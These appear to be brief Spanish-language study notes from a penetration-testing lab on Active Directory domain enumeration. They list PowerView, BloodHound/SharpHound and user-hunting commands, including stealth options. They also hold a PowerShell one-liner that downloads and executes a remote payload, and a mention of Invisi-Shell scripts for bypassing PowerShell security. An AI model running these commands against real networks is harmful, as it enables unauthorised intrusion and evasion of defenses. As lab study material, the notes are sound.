# Domain Enumeration

Descargar archivos:
`iex (New-Object Net.WebClient).DownloadString('[https://webserver/payload.ps1](https://webserver/payload.ps1)')`

Invisi-Shell para Bypassear Seg. en PowerShell:

priv. Admin: `RunWithPathAsAdmin.bat`

priv. NonAdmin: `RunWithRegistryNonAdmin.bat`

Para enumerar:

-BloodHound

-PowerView.ps1

BloodHound:

-`Run SharpHound.ps1` → `invoke-BloodHound -CollectionMethod All` or `SharpHound.exe`

-Generan unos archivos para BloodHound

Comandos para enumerar dominios y grupos:

-`Get-Domain` (Power-View), `Get-ADDomain` (Active Directory Module)

-`Get-Domain -Domain techcorp.local` (de otro dominio)

-`Get-DomainUser` , `Get-DomainGroup` , `Get-DomainComputer` , `Get-DomainController`  , `Get-DomainSID` , `Get-DomainGroup **admin*` , `Get-NetLocalGroup` , `Get-NetLocalGroupMember` , `Get-DomainOU` , `Get-DomainObjectAcl -Identity studentuser1 –ResolveGUIDs` , `Find-InterestingDomainAcl -ResolveGUIDs` , `Get-DomainTrust` , `Get-Forest` ,* 

*`Get-ForestDomain` , `Get-ForestGlobalCatalog` , `Get-ForestTrust`* 

UserHunting: `Find-WMILocalAdminAccess.ps1` && `Find-PSRemotingLocalAdminAccess.ps1`

`Find-LocalAdminAccess –Verbose`

`Find-DomainUserLocation -Verbose`

`Find-DomainUserLocation -CheckAccess`

`Find-DomainUserLocation –Stealth`